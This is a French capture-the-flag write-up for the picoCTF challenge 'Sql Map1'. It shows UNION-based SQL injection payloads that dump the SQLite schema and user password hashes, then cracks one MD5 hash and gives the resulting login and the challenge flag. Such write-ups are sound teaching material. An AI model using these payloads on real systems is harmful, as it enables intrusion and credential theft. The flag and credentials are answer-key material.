# Writeup : Sql Map1 (picoCTF)

## 1. Reconnaissance
Le challenge présente une application web avec une fonctionnalité de recherche de "flags" et un système de login/enregistrement. Les indices suggèrent que la boîte de recherche est vulnérable et que les mots de passe sont stockés sous forme de hashes MD5 non salés.

## 2. Injection SQL
En testant le paramètre de recherche `q`, on confirme une vulnérabilité à l'injection SQL (SQLite).

### Énumération des colonnes
L'utilisation de `ORDER BY` montre que la requête originale sélectionne 2 colonnes.

### Extraction de la structure
```sql
' UNION SELECT name, sql FROM sqlite_master --
```
Cela révèle deux tables intéressantes :
- `users` (id, username, password)
- `flags` (id, key, value)

### Exfiltration des données
Extraction des hashes MD5 des utilisateurs :
```sql
' UNION SELECT username, password FROM users --
```
Résultats :
- `admin`: `5a9a79d9fa477ed163b89088681672c9`
- `ctf-player`: `7a67ab5872843b22b5e14511867c4e43`
- ...

## 3. Cassage de hash (MD5 Cracking)
En soumettant les hashes à un service comme **CrackStation**, on obtient le mot de passe de `ctf-player` :
`7a67ab5872843b22b5e14511867c4e43` -> **`dyesebel`**

Le hash de l'admin n'est pas dans les bases de données publiques courantes.

## 4. Accès au Flag
En se connectant avec les identifiants `ctf-player` / `dyesebel`, l'application redirige vers `secret.php`, qui affiche le flag final.

**Flag :** `picoCTF{F0uNd_s3cr3T_K3y_f0R_w3_<>}`
